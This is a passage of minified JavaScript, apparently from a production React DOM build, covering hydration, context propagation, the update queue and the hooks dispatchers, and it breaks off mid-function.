lg(r){r.return!==null&&(vo(r,1),$w(r,1,0))}function cg(r){for(;r===Th;)Th=Al[--El],Al[El]=null,Ch=Al[--El],Al[El]=null;for(;r===yo;)yo=Zi[--Ji],Zi[Ji]=null,ys=Zi[--Ji],Zi[Ji]=null,gs=Zi[--Ji],Zi[Ji]=null}var ri=null,Yt=null,xt=!1,_o=null,Ur=!1,ug=Error(i(519));function wo(r){var a=Error(i(418,""));throw ou($i(a,r)),ug}function Xw(r){var a=r.stateNode,l=r.type,u=r.memoizedProps;switch(a[le]=r,a[pe]=u,l){case"dialog":at("cancel",a),at("close",a);break;case"iframe":case"object":case"embed":at("load",a);break;case"video":case"audio":for(l=0;l<ku.length;l++)at(ku[l],a);break;case"source":at("error",a);break;case"img":case"image":case"link":at("error",a),at("load",a);break;case"details":at("toggle",a);break;case"input":at("invalid",a),io(a,u.value,u.defaultValue,u.checked,u.defaultChecked,u.type,u.name,!0),ll(a);break;case"select":at("invalid",a);break;case"textarea":at("invalid",a),ro(a,u.value,u.defaultValue,u.children),ll(a)}l=u.children,typeof l!="string"&&typeof l!="number"&&typeof l!="bigint"||a.textContent===""+l||u.suppressHydrationWarning===!0||m1(a.textContent,l)?(u.popover!=null&&(at("beforetoggle",a),at("toggle",a)),u.onScroll!=null&&at("scroll",a),u.onScrollEnd!=null&&at("scrollend",a),u.onClick!=null&&(a.onclick=of),a=!0):a=!1,a||wo(r)}function Zw(r){for(ri=r.return;ri;)switch(ri.tag){case 5:case 13:Ur=!1;return;case 27:case 3:Ur=!0;return;default:ri=ri.return}}function su(r){if(r!==ri)return!1;if(!xt)return Zw(r),xt=!0,!1;var a=r.tag,l;if((l=a!==3&&a!==27)&&((l=a===5)&&(l=r.type,l=!(l!=="form"&&l!=="button")||Cy(r.type,r.memoizedProps)),l=!l),l&&Yt&&wo(r),Zw(r),a===13){if(r=r.memoizedState,r=r!==null?r.dehydrated:null,!r)throw Error(i(317));e:{for(r=r.nextSibling,a=0;r;){if(r.nodeType===8)if(l=r.data,l==="/$"){if(a===0){Yt=pr(r.nextSibling);break e}a--}else l!=="$"&&l!=="$!"&&l!=="$?"||a++;r=r.nextSibling}Yt=null}}else a===27?(a=Yt,ya(r.type)?(r=Iy,Iy=null,Yt=r):Yt=a):Yt=ri?pr(r.stateNode.nextSibling):null;return!0}function au(){Yt=ri=null,xt=!1}function Jw(){var r=_o;return r!==null&&(fi===null?fi=r:fi.push.apply(fi,r),_o=null),r}function ou(r){_o===null?_o=[r]:_o.push(r)}var dg=ae(null),bo=null,vs=null;function na(r,a,l){ue(dg,a._currentValue),a._currentValue=l}function _s(r){r._currentValue=dg.current,ge(dg)}function hg(r,a,l){for(;r!==null;){var u=r.alternate;if((r.childLanes&a)!==a?(r.childLanes|=a,u!==null&&(u.childLanes|=a)):u!==null&&(u.childLanes&a)!==a&&(u.childLanes|=a),r===l)break;r=r.return}}function fg(r,a,l,u){var m=r.child;for(m!==null&&(m.return=r);m!==null;){var y=m.dependencies;if(y!==null){var A=m.child;y=y.firstContext;e:for(;y!==null;){var S=y;y=m;for(var U=0;U<a.length;U++)if(S.context===a[U]){y.lanes|=l,S=y.alternate,S!==null&&(S.lanes|=l),hg(y.return,l,r),u||(A=null);break e}y=S.next}}else if(m.tag===18){if(A=m.return,A===null)throw Error(i(341));A.lanes|=l,y=A.alternate,y!==null&&(y.lanes|=l),hg(A,l,r),A=null}else A=m.child;if(A!==null)A.return=m;else for(A=m;A!==null;){if(A===r){A=null;break}if(m=A.sibling,m!==null){m.return=A.return,A=m;break}A=A.return}m=A}}function lu(r,a,l,u){r=null;for(var m=a,y=!1;m!==null;){if(!y){if((m.flags&524288)!==0)y=!0;else if((m.flags&262144)!==0)break}if(m.tag===10){var A=m.alternate;if(A===null)throw Error(i(387));if(A=A.memoizedProps,A!==null){var S=m.type;Si(m.pendingProps.value,A.value)||(r!==null?r.push(S):r=[S])}}else if(m===it.current){if(A=m.alternate,A===null)throw Error(i(387));A.memoizedState.memoizedState!==m.memoizedState.memoizedState&&(r!==null?r.push(Lu):r=[Lu])}m=m.return}r!==null&&fg(a,r,l,u),a.flags|=262144}function Sh(r){for(r=r.firstContext;r!==null;){if(!Si(r.context._currentValue,r.memoizedValue))return!0;r=r.next}return!1}function xo(r){bo=r,vs=null,r=r.dependencies,r!==null&&(r.firstContext=null)}function Gn(r){return e2(bo,r)}function Nh(r,a){return bo===null&&xo(r),e2(r,a)}function e2(r,a){var l=a._currentValue;if(a={context:a,memoizedValue:l,next:null},vs===null){if(r===null)throw Error(i(308));vs=a,r.dependencies={lanes:0,firstContext:a},r.flags|=524288}else vs=vs.next=a;return l}var IR=typeof AbortController<"u"?AbortController:function(){var r=[],a=this.signal={aborted:!1,addEventListener:function(l,u){r.push(u)}};this.abort=function(){a.aborted=!0,r.forEach(function(l){return l()})}},kR=t.unstable_scheduleCallback,DR=t.unstable_NormalPriority,mn={$$typeof:D,Consumer:null,Provider:null,_currentValue:null,_currentValue2:null,_threadCount:0};function mg(){return{controller:new IR,data:new Map,refCount:0}}function cu(r){r.refCount--,r.refCount===0&&kR(DR,function(){r.controller.abort()})}var uu=null,pg=0,Tl=0,Cl=null;function MR(r,a){if(uu===null){var l=uu=[];pg=0,Tl=yy(),Cl={status:"pending",value:void 0,then:function(u){l.push(u)}}}return pg++,a.then(t2,t2),a}function t2(){if(--pg===0&&uu!==null){Cl!==null&&(Cl.status="fulfilled");var r=uu;uu=null,Tl=0,Cl=null;for(var a=0;a<r.length;a++)(0,r[a])()}}function OR(r,a){var l=[],u={status:"pending",value:null,reason:null,then:function(m){l.push(m)}};return r.then(function(){u.status="fulfilled",u.value=a;for(var m=0;m<l.length;m++)(0,l[m])(a)},function(m){for(u.status="rejected",u.reason=m,m=0;m<l.length;m++)(0,l[m])(void 0)}),u}var n2=ee.S;ee.S=function(r,a){typeof a=="object"&&a!==null&&typeof a.then=="function"&&MR(r,a),n2!==null&&n2(r,a)};var Ao=ae(null);function gg(){var r=Ao.current;return r!==null?r:Vt.pooledCache}function Rh(r,a){a===null?ue(Ao,Ao.current):ue(Ao,a.pool)}function i2(){var r=gg();return r===null?null:{parent:mn._currentValue,pool:r}}var du=Error(i(460)),r2=Error(i(474)),Ih=Error(i(542)),yg={then:function(){}};function s2(r){return r=r.status,r==="fulfilled"||r==="rejected"}function kh(){}function a2(r,a,l){switch(l=r[l],l===void 0?r.push(a):l!==a&&(a.then(kh,kh),a=l),a.status){case"fulfilled":return a.value;case"rejected":throw r=a.reason,l2(r),r;default:if(typeof a.status=="string")a.then(kh,kh);else{if(r=Vt,r!==null&&100<r.shellSuspendCounter)throw Error(i(482));r=a,r.status="pending",r.then(function(u){if(a.status==="pending"){var m=a;m.status="fulfilled",m.value=u}},function(u){if(a.status==="pending"){var m=a;m.status="rejected",m.reason=u}})}switch(a.status){case"fulfilled":return a.value;case"rejected":throw r=a.reason,l2(r),r}throw hu=a,du}}var hu=null;function o2(){if(hu===null)throw Error(i(459));var r=hu;return hu=null,r}function l2(r){if(r===du||r===Ih)throw Error(i(483))}var ia=!1;function vg(r){r.updateQueue={baseState:r.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,lanes:0,hiddenCallbacks:null},callbacks:null}}function _g(r,a){r=r.updateQueue,a.updateQueue===r&&(a.updateQueue={baseState:r.baseState,firstBaseUpdate:r.firstBaseUpdate,lastBaseUpdate:r.lastBaseUpdate,shared:r.shared,callbacks:null})}function ra(r){return{lane:r,tag:0,payload:null,callback:null,next:null}}function sa(r,a,l){var u=r.updateQueue;if(u===null)return null;if(u=u.shared,(Nt&2)!==0){var m=u.pending;return m===null?a.next=a:(a.next=m.next,m.next=a),u.pending=a,a=Ah(r),Kw(r,null,l),a}return xh(r,u,a,l),Ah(r)}function fu(r,a,l){if(a=a.updateQueue,a!==null&&(a=a.shared,(l&4194048)!==0)){var u=a.lanes;u&=r.pendingLanes,l|=u,a.lanes=l,Nr(r,l)}}function wg(r,a){var l=r.updateQueue,u=r.alternate;if(u!==null&&(u=u.updateQueue,l===u)){var m=null,y=null;if(l=l.firstBaseUpdate,l!==null){do{var A={lane:l.lane,tag:l.tag,payload:l.payload,callback:null,next:null};y===null?m=y=A:y=y.next=A,l=l.next}while(l!==null);y===null?m=y=a:y=y.next=a}else m=y=a;l={baseState:u.baseState,firstBaseUpdate:m,lastBaseUpdate:y,shared:u.shared,callbacks:u.callbacks},r.updateQueue=l;return}r=l.lastBaseUpdate,r===null?l.firstBaseUpdate=a:r.next=a,l.lastBaseUpdate=a}var bg=!1;function mu(){if(bg){var r=Cl;if(r!==null)throw r}}function pu(r,a,l,u){bg=!1;var m=r.updateQueue;ia=!1;var y=m.firstBaseUpdate,A=m.lastBaseUpdate,S=m.shared.pending;if(S!==null){m.shared.pending=null;var U=S,J=U.next;U.next=null,A===null?y=J:A.next=J,A=U;var se=r.alternate;se!==null&&(se=se.updateQueue,S=se.lastBaseUpdate,S!==A&&(S===null?se.firstBaseUpdate=J:S.next=J,se.lastBaseUpdate=U))}if(y!==null){var ce=m.baseState;A=0,se=J=U=null,S=y;do{var te=S.lane&-536870913,ne=te!==S.lane;if(ne?(ft&te)===te:(u&te)===te){te!==0&&te===Tl&&(bg=!0),se!==null&&(se=se.next={lane:0,tag:S.tag,payload:S.payload,callback:null,next:null});e:{var Fe=r,Le=S;te=a;var Mt=l;switch(Le.tag){case 1:if(Fe=Le.payload,typeof Fe=="function"){ce=Fe.call(Mt,ce,te);break e}ce=Fe;break e;case 3:Fe.flags=Fe.flags&-65537|128;case 0:if(Fe=Le.payload,te=typeof Fe=="function"?Fe.call(Mt,ce,te):Fe,te==null)break e;ce=v({},ce,te);break e;case 2:ia=!0}}te=S.callback,te!==null&&(r.flags|=64,ne&&(r.flags|=8192),ne=m.callbacks,ne===null?m.callbacks=[te]:ne.push(te))}else ne={lane:te,tag:S.tag,payload:S.payload,callback:S.callback,next:null},se===null?(J=se=ne,U=ce):se=se.next=ne,A|=te;if(S=S.next,S===null){if(S=m.shared.pending,S===null)break;ne=S,S=ne.next,ne.next=null,m.lastBaseUpdate=ne,m.shared.pending=null}}while(!0);se===null&&(U=ce),m.baseState=U,m.firstBaseUpdate=J,m.lastBaseUpdate=se,y===null&&(m.shared.lanes=0),fa|=A,r.lanes=A,r.memoizedState=ce}}function c2(r,a){if(typeof r!="function")throw Error(i(191,r));r.call(a)}function u2(r,a){var l=r.callbacks;if(l!==null)for(r.callbacks=null,r=0;r<l.length;r++)c2(l[r],a)}var Sl=ae(null),Dh=ae(0);function d2(r,a){r=Cs,ue(Dh,r),ue(Sl,a),Cs=r|a.baseLanes}function xg(){ue(Dh,Cs),ue(Sl,Sl.current)}function Ag(){Cs=Dh.current,ge(Sl),ge(Dh)}var aa=0,$e=null,kt=null,on=null,Mh=!1,Nl=!1,Eo=!1,Oh=0,gu=0,Rl=null,PR=0;function Xt(){throw Error(i(321))}function Eg(r,a){if(a===null)return!1;for(var l=0;l<a.length&&l<r.length;l++)if(!Si(r[l],a[l]))return!1;return!0}function Tg(r,a,l,u,m,y){return aa=y,$e=a,a.memoizedState=null,a.updateQueue=null,a.lanes=0,ee.H=r===null||r.memoizedState===null?K2:W2,Eo=!1,y=l(u,m),Eo=!1,Nl&&(y=f2(a,l,u,m)),h2(r),y}function h2(r){ee.H=Bh;var a=kt!==null&&kt.next!==null;if(aa=0,on=kt=$e=null,Mh=!1,gu=0,Rl=null,a)throw Error(i(300));r===null||bn||(r=r.dependencies,r!==null&&Sh(r)&&(bn=!0))}function f2(r,a,l,u){$e=r;var m=0;do{if(Nl&&(Rl=null),gu=0,Nl=!1,25<=m)throw Error(i(301));if(m+=1,on=kt=null,r.updateQueue!=null){var y=r.updateQueue;y.lastEffect=null,y.events=null,y.stores=null,y.memoCache!=null&&(y.memoCache.index=0)}ee.H=FR,y=a(l,u)}while(Nl);return y}function jR(){var r=ee.H,a=r.useState()[0];return a=typeof a.then=="function"?yu(a):a,r=r.useState()[0],(kt!==null?kt.memoizedState:null)!==r&&($e.flags|=1024),a}function Cg(){var r=Oh!==0;return Oh=0,r}function Sg(r,a,l){a.updateQueue=r.updateQueue,a.flags&=-2053,r.lanes&=~l}function Ng(r){if(Mh){for(r=r.memoizedState;r!==null;){var a=r.queue;a!==null&&(a.pending=null),r=r.next}Mh=!1}aa=0,on=kt=$e=null,Nl=!1,gu=Oh=0,Rl=null}function di(){var r={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return on===null?$e.memoizedState=on=r:on=on.next=r,on}function ln(){if(kt===null){var r=$e.alternate;r=r!==null?r.memoizedState:null}else r=kt.next;var a=on===null?$e.memoizedState:on.next;if(a!==null)on=a,kt=r;else{if(r===null)throw $e.alternate===null?Error(i(467)):Error(i(310));kt=r,r={memoizedState:kt.memoizedState,baseState:kt.baseState,baseQueue:kt.baseQueue,queue:kt.queue,next:null},on===null?$e.memoizedState=on=r:on=on.next=r}return on}function Rg(){return{lastEffect:null,events:null,stores:null,memoCache:null}}function yu(r){var a=gu;return gu+=1,Rl===null&&(Rl=[]),r=a2(Rl,r,a),a=$e,(on===null?a.memoizedState:on.next)===null&&(a=a.alternate,ee.H=a===null||a.memoizedState===null?K2:W2),r}function Ph(r){if(r!==null&&typeof r=="object"){if(typeof r.then=="function")return yu(r);if(r.$$typeof===D)return Gn(r)}throw Error(i(438,String(r)))}function Ig(r){var a=null,l=$e.updateQueue;if(l!==null&&(a=l.memoCache),a==null){var u=$e.alternate;u!==null&&(u=u.updateQueue,u!==null&&(u=u.memoCache,u!=null&&(a={data:u.data.map(function(m){return m.slice()}),index:0})))}if(a==null&&(a={data:[],index:0}),l===null&&(l=Rg(),$e.updateQueue=l),l.memoCache=a,l=a.data[a.index],l===void 0)for(l=a.data[a.index]=Array(r),u=0;u<r;u++)l[u]=I;return a.index++,l}function ws(r,a){return typeof a=="function"?a(r):a}function jh(r){var a=ln();return kg(a,kt,r)}function kg(r,a,l){var u=r.queue;if(u===null)throw Error(i(311));u.lastRenderedReducer=l;var m=r.baseQueue,y=u.pending;if(y!==null){if(m!==null){var A=m.next;m.next=y.next,y.next=A}a.baseQueue=m=y,u.pending=null}if(y=r.baseState,m===null)r.memoizedState=y;else{a=m.next;var S=A=null,U=null,J=a,se=!1;do{var ce=J.lane&-536870913;if(ce!==J.lane?(ft&ce)===ce:(aa&ce)===ce){var te=J.revertLane;if(te===0)U!==null&&(U=U.next={lane:0,revertLane:0,action:J.action,hasEagerState:J.hasEagerState,eagerState:J.eagerState,next:null}),ce===Tl&&(se=!0);else if((aa&te)===te){J=J.next,te===Tl&&(se=!0);continue}else ce={lane:0,revertLane:J.revertLane,action:J.action,hasEagerState:J.hasEagerState,eagerState:J.eagerState,next:null},U===null?(S=U=ce,A=y):U=U.next=ce,$e.lanes|=te,fa|=te;ce=J.action,Eo&&l(y,ce),y=J.hasEagerState?J.eagerState:l(y,ce)}else te={lane:ce,revertLane:J.revertLane,action:J.action,hasEagerState:J.hasEagerState,eagerState:J.eagerState,next:null},U===null?(S=U=te,A=y):U=U.next=te,$e.lanes|=ce,fa|=ce;J=J.next}while(J!==null&&J!==a);if(U===null?A=y:U.next=S,!Si(y,r.memoizedState)&&(bn=!0,se&&(l=Cl,l!==null)))throw l;r.memoizedState=y,r.baseState=A,r.baseQueue=U,u.lastRenderedState=y}return m===null&&(u.lanes=0),[r.memoizedState,u.dispatch]}function Dg(r){var a=ln(),l=a.queue;if(l===null)throw Error(i(311));l.lastRenderedReducer=r;var u=l.dispatch,m=l.pending,y=a.memoizedState;if(m!==null){l.pending=null;var A=m=m.next;do y=r(y,A.action),A=A.next;while(A!==m);Si(y,a.memoizedState)||(bn=!0),a.memoizedState=y,a.baseQueue===null&&(a.baseState=y),l.lastRenderedState=y}return[y,u]}function m2(r,a,l){var u=$e,m=ln(),y=xt;if(y){if(l===void 0)throw Error(i(407));l=l()}else l=a();var A=!Si((kt||m).memoizedState,l);A&&(m.memoizedState=l,bn=!0),m=m.queue;var S=y2.bind(null,u,m,r);if(vu(2048,8,S,[r]),m.getSnapshot!==a||A||on!==null&&on.memoizedState.tag&1){if(u.flags|=2048,Il(9,Lh(),g2.bind(null,u,m,l,a),null),Vt===null)throw Error(i(349));y||(aa&124)!==0||p2(u,a,l)}return l}function p2(r,a,l){r.flags|=16384,r={getSnapshot:a,value:l},a=$e.updateQueue,a===null?(a=Rg(),$e.updateQueue=a,a.stores=[r]):(l=a.stores,l===null?a.stores=[r]:l.push(r))}function g2(r,a,l,u){a.value=l,a.getSnapshot=u,v2(a)&&_2(r)}function y2(r,a,l){return l(function(){v2(a)&&_2(r)})}function v2(r){var a=r.getSnapshot;r=r.value;try{var l=a();return!Si(r,l)}catch{return!0}}function _2(r){var a=bl(r,2);a!==null&&Mi(a,r,2)}function Mg(r){var a=di();if(typeof r=="function"){var l=r;if(r=l(),Eo){Hn(!0);try{l()}finally{Hn(!1)}}}return a.memoizedState=a.baseState=r,a.queue={pending:null,lanes:0,dispatch:null,lastRenderedReducer:ws,lastRenderedState:r},a}function w2(r,a,l,u){return r.baseState=l,kg(r,kt,typeof u=="function"?u:ws)}function LR(r,a,l,u,m){if(Uh(r))throw Error(i(485));if(r=a.action,r!==null){var y={payload:m,action:r,next:null,isTransition:!0,status:"pending",value:null,reason:null,listeners:[],then:function(A){y.listeners.push(A)}};ee.T!==null?l(!0):y.isTransition=!1,u(y),l=a.pending,l===null?(y.next=a.pending=y,b2(a,y)):(y.next=l.next,a.pending=l.next=y)}}function b2(r,a){var l=a.action,u=a.payload,m=r.state;if(a.isTransition){var y=ee.T,A={};ee.T=A;try{var S=l(m,u),U=ee.S;U!==null&&U(A,S),x2(r,a,S)}catch(J){Og(r,a,J)}finally{ee.T=y}}else try{y=l(m,u),x2(r,a,y)}catch(J){Og(r,a,J)}}function x2(r,a,l){l!==null&&typeof l=="object"&&typeof l.then=="function"?l.then(function(u){A2(r,a,u)},function(u){return Og(r,a,u)}):A2(r,a,l)}function A2(r,a,l){a.status="fulfilled",a.value=l,E2(a),r.state=l,a=r.pending,a!==null&&(l=a.next,l===a?r.pending=null:(l=l.next,a.next=l,b2(r,l)))}function Og(r,a,l){var u=r.pending;if(r.pending=null,u!==null){u=u.next;do a.status="rejected",a.reason=l,E2(a),a=a.next;while(a!==u)}r.action=null}function E2(r){r=r.listeners;for(var a=0;a<r.length;a++)(0,r[a])()}function T2(r,a){return a}function C2(r,a){if(xt){var l=Vt.formState;if(l!==null){e:{var u=$e;if(xt){if(Yt){t:{for(var m=Yt,y=Ur;m.nodeType!==8;){if(!y){m=null;break t}if(m=pr(m.nextSibling),m===null){m=null;break t}}y=m.data,m=y==="F!"||y==="F"?m:null}if(m){Yt=pr(m.nextSibling),u=m.data==="F!";break e}}wo(u)}u=!1}u&&(a=l[0])}}return l=di(),l.memoizedState=l.baseState=a,u={pending:null,lanes:0,dispatch:null,lastRenderedReducer:T2,lastRenderedState:a},l.queue=u,l=G2.bind(null,$e,u),u.dispatch=l,u=Mg(!1),y=Ug.bind(null,$e,!1,u.queue),u=di(),m={state:a,dispatch:null,action:r,pending:null},u.queue=m,l=LR.bind(null,$e,m,y,l),m.dispatch=l,u.memoizedState=r,[a,l,!1]}function S2(r){var a=ln();return N2(a,kt,r)}function N2(r,a,l){if(a=kg(r,a,T2)[0],r=jh(ws)[0],typeof a=="object"&&a!==null&&typeof a.then=="function")try{var u=yu(a)}catch(A){throw A===du?Ih:A}else u=a;a=ln();var m=a.queue,y=m.dispatch;return l!==a.memoizedState&&($e.flags|=2048,Il(9,Lh(),VR.bind(null,m,l),null)),[u,y,r]}function VR(r,a){r.action=a}function R2(r){var a=ln(),l=kt;if(l!==null)return N2(a,l,r);ln(),a=a.memoizedState,l=ln();var u=l.queue.dispatch;return l.memoizedState=r,[a,u,!1]}function Il(r,a,l,u){return r={tag:r,create:l,deps:u,inst:a,next:null},a=$e.updateQueue,a===null&&(a=Rg(),$e.updateQueue=a),l=a.lastEffect,l===null?a.lastEffect=r.next=r:(u=l.next,l.next=r,r.next=u,a.lastEffect=r),r}function Lh(){return{destroy:void 0,resource:void 0}}function I2(){return ln().memoizedState}function Vh(r,a,l,u){var m=di();u=u===void 0?null:u,$e.flags|=r,m.memoizedState=Il(1|a,Lh(),l,u)}function vu(r,a,l,u){var m=ln();u=u===void 0?null:u;var y=m.memoizedState.inst;kt!==null&&u!==null&&Eg(u,kt.memoizedState.deps)?m.memoizedState=Il(a,y,l,u):($e.flags|=r,m.memoizedState=Il(1|a,y,l,u))}function k2(r,a){Vh(8390656,8,r,a)}function D2(r,a){vu(2048,8,r,a)}function M2(r,a){return vu(4,2,r,a)}function O2(r,a){return vu(4,4,r,a)}function P2(r,a){if(typeof a=="function"){r=r();var l=a(r);return function(){typeof l=="function"?l():a(null)}}if(a!=null)return r=r(),a.current=r,function(){a.current=null}}function j2(r,a,l){l=l!=null?l.concat([r]):null,vu(4,4,P2.bind(null,a,r),l)}function Pg(){}function L2(r,a){var l=ln();a=a===void 0?null:a;var u=l.memoizedState;return a!==null&&Eg(a,u[1])?u[0]:(l.memoizedState=[r,a],r)}function V2(r,a){var l=ln();a=a===void 0?null:a;var u=l.memoizedState;if(a!==null&&Eg(a,u[1]))return u[0];if(u=r(),Eo){Hn(!0);try{r()}finally{Hn(!1)}}return l.memoizedState=[u,a],u}function jg(r,a,l){return l===void 0||(aa&1073741824)!==0?r.memoizedState=a:(r.memoizedState=l,r=zb(),$e.lanes|=r,fa|=r,l)}function U2(r,a,l,u){return Si(l,a)?l:Sl.current!==null?(r=jg(r,l,u),Si(r,a)||(bn=!0),r):(aa&42)===0?(bn=!0,r.memoizedState=l):(r=zb(),$e.lanes|=r,fa|=r,a)}function B2(r,a,l,u,m){var y=me.p;me.p=y!==0&&8>y?y:8;var A=ee.T,S={};ee.T=S,Ug(r,!1,a,l);try{var U=m(),J=ee.S;if(J!==null&&J(S,U),U!==null&&typeof U=="object"&&typeof U.then=="function"){var se=OR(U,u);_u(r,a,se,Di(r))}else _u(r,a,u,Di(r))}catch(ce){_u(r,a,{then:function(){},status:"rejected",reason:ce},Di())}finally{me.p=y,ee.T=A}}function UR(){}function Lg(r,a,l,u){if(r.tag!==5)throw Error(i(476));var m=z2(r).queue;B2(r,m,a,we,l===null?UR:function(){return F2(r),l(u)})}function z2(r){var a=r.memoizedState;if(a!==null)return a;a={memoizedState:we,baseState:we,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:ws,lastRenderedState:we},next:null};var l={};return a.next={memoizedState:l,baseState:l,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:ws,lastRenderedState:l},next:null},r.memoizedState=a,r=r.alternate,r!==null&&(r.memoizedState=a),a}function F2(r){var a=z2(r).next.queue;_u(r,a,{},Di())}function Vg(){return Gn(Lu)}function H2(){return ln().memoizedState}function q2(){return ln().memoizedState}function BR(r){for(var a=r.return;a!==null;){switch(a.tag){case 24:case 3:var l=Di();r=ra(l);var u=sa(a,r,l);u!==null&&(Mi(u,a,l),fu(u,a,l)),a={cache:mg()},r.payload=a;return}a=a.return}}function zR(r,a,l){var u=Di();l={lane:u,revertLane:0,action:l,hasEagerState:!1,eagerState:null,next:null},Uh(r)?Y2(a,l):(l=rg(r,a,l,u),l!==null&&(Mi(l,r,u),Q2(l,a,u)))}function G2(r,a,l){var u=Di();_u(r,a,l,u)}function _u(r,a,l,u){var m={lane:u,revertLane:0,action:l,hasEagerState:!1,eagerState:null,next:null};if(Uh(r))Y2(a,m);else{var y=r.alternate;if(r.lanes===0&&(y===null||y.lanes===0)&&(y=a.lastRenderedReducer,y!==null))try{var A=a.lastRenderedState,S=y(A,l);if(m.hasEagerState=!0,m.eagerState=S,Si(S,A))return xh(r,a,m,0),Vt===null&&bh(),!1}catch{}finally{}if(l=rg(r,a,m,u),l!==null)return Mi(l,r,u),Q2(l,a,u),!0}return!1}function Ug(r,a,l,u){if(u={lane:2,revertLane:yy(),action:u,hasEagerState:!1,eagerState:null,next:null},Uh(r)){if(a)throw Error(i(479))}else a=rg(r,l,u,2),a!==null&&Mi(a,r,2)}function Uh(r){var a=r.alternate;return r===$e||a!==null&&a===$e}function Y2(r,a){Nl=Mh=!0;var l=r.pending;l===null?a.next=a:(a.next=l.next,l.next=a),r.pending=a}function Q2(r,a,l){if((l&4194048)!==0){var u=a.lanes;u&=r.pendingLanes,l|=u,a.lanes=l,Nr(r,l)}}var Bh={readContext:Gn,use:Ph,useCallback:Xt,useContext:Xt,useEffect:Xt,useImperativeHandle:Xt,useLayoutEffect:Xt,useInsertionEffect:Xt,useMemo:Xt,useReducer:Xt,useRef:Xt,useState:Xt,useDebugValue:Xt,useDeferredValue:Xt,useTransition:Xt,useSyncExternalStore:Xt,useId:Xt,useHostTransitionStatus:Xt,useFormState:Xt,useActionState:Xt,useOptimistic:Xt,useMemoCache:Xt,useCacheRefresh:Xt},K2={readContext:Gn,use:Ph,useCallback:function(r,a){return di().memoizedState=[r,a===void 0?null:a],r},useContext:Gn,useEffect:k2,useImperativeHandle:function(r,a,l){l=l!=null?l.concat([r]):null,Vh(4194308,4,P2.bind(null,a,r),l)},useLayoutEffect:function(r,a){return Vh(4194308,4,r,a)},useInsertionEffect:function(r,a){Vh(4,2,r,a)},useMemo:function(r,a){var l=di();a=a===void 0?null:a;var u=r();if(Eo){Hn(!0);try{r()}finally{Hn(!1)}}return l.memoizedState=[u,a],u},useReducer:function(r,a,l){var u=di();if(l!==void 0){var m=l(a);if(Eo){Hn(!0);try{l(a)}finally{Hn(!1)}}}else m=a;return u.memoizedState=u.baseState=m,r={pending:null,lanes:0,dispatch:null,lastRenderedReducer:r,lastRenderedState:m},u.queue=r,r=r.dispatch=zR.bind(null,$e,r),[u.memoizedState,r]},useRef:function(r){var a=di();return r={current:r},a.memoizedState=r},useState:function(r){r=Mg(r);var a=r.queue,l=G2.bind(null,$e,a);return a.dispatch=l,[r.memoizedState,l]},useDebugValue:Pg,useDeferredValue:function(r,a){var l=di();return jg(l,r,a)},useTransition:function(){var r=Mg(!1);return r=B2.bind(null,$e,r.queue,!0,!1),di().memoizedState=r,[!1,r]},useSyncExternalStore:function(r,a,l){var u=$e,m=di();if(xt){if(l===void 0)throw Error(i(407));l=l()}else{if(l=a(),Vt===null)throw Error(i(349));(ft&124)!==0||p2(u,a,l)}m.memoizedState=l;var y={value:l,getSnapshot:a};return m.queue=y,k2(y2.bind(null,u,y,r),[r]),u.flags|=2048,Il(9,Lh(),g2.bind(null,u,y,l,a),null),l},useId:function(){var r=di(),a=Vt.identifierPrefix;if(xt){var l=ys,u=gs;l=(u&~(1<<32-rn(u)-1)).toString(32)+l,a=""+a+"R"+l,l=Oh++,0<l&&(a+="H"+l.toString(32)),a+=""}else l=PR++,a=""+a+"r"+l.toString(32)+"";return r.memoizedState=a},useHostTransitionStatus:Vg,useFormState:C2,useActionState:C2,useOptimistic:function(r){var a=di();a.memoizedState=a.baseState=r;var l={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return a.queue=l,a=Ug.bind(null,$e,!0,l),l.dispatch=a,[r,a]},useMemoCache:Ig,useCacheRefresh:function(){return di().memoizedState=BR.bind(null,$e)}},W2={readContext:Gn,use:Ph,useCallback:L2,useContext:Gn,useEffect:D2,useImperativeHandle:j2,useInsertionEffect:M2,useLayoutEffect:O2,useMemo:V2,useReducer:jh,useRef:I2,useState:function(){return jh(ws)},useDebugValue:Pg,useDeferredValue:function(r,a){var l=ln();return U2(l,kt.memoizedState,r,a)},useTransition:function(){var r=jh(ws)[0],a=ln().memoizedState;return[typeof r=="boolean"?r:yu(r),a]},useSyncExternalStore:m2,useId:H2,useHostTransitionStatus:Vg,useFormState:S2,useActionState:S2,useOptimistic:function(r,a){var l=ln();return w2(l,kt,r,a)},useMemoCache:Ig,useCacheRefresh:q2},FR={readContext:Gn,use:Ph,useCallback:L2,useContext:Gn,useEffect:D2,useImperativeHandle:j2,useInsertionEffect:M2,useLayoutEffect:O2,useMemo:V2,useReducer:Dg,useRef:I2,useState:function(){return Dg(ws)},useDebugValue:Pg,useDeferredValue:function(r,a){var l=ln();return kt===null?jg(l,r,a):U2(l,kt.memoizedState,r,a)},useTransition:function(){var r=Dg(ws)[0],a=ln().memoizedState;return[typeof r=="boolean"?r:yu(r),a]},useSyncExternalStore:m2,useId:H2,useHostTransitionStatus:Vg,useFormState:R2,useActionState:R2,useOptimistic:function(r,a){var l=ln();return kt!==null?w2(l,kt,r,a):(l.baseState=r,[r,l.queue.dispatch])},useMemoCache:Ig,useCacheRefresh:q2},kl=null,wu=0;function zh(r){var a=wu;return wu+=1,kl===null&&(kl=[]),a2(kl,r,a)}function bu(r,a){a=a.props.ref,r.ref=a!==void 0?a:null}function Fh(r,a){throw a.$$typeof===b?Error(i(525)):(r=Object.prototype.toString.call(a),Error(i(31,r==="[object Object]"?"object with keys {"+Object.keys(a).join(", ")+"}":r)))}function $2(r){var a=r._init;return a(r._payload)}function X2(r){function a(K,q){if(r){var X=K.deletions;X===null?(K.deletions=[q],K.flags|=16):X.push(q)}}function l(K,q){if(!r)return null;for(;q!==null;)a(K,q),q=q.sibling;return null}function u(K){for(var q=new Map;K!==null;)K.key!==null?q.set(K.key,K):q.set(K.index,K),K=K.sibling;return q}function m(K,q){return K=ps(K,q),K.index=0,K.sibling=null,K}function y(K,q,X){return K.index=X,r?(X=K.alternate,X!==null?(X=X.index,X<q?(K.flags|=67108866,q):X):(K.flags|=67108866,q)):(K.flags|=1048576,q)}function A(K){return r&&K.alternate===null&&(K.flags|=67108866),K}function S(K,q,X,oe){return 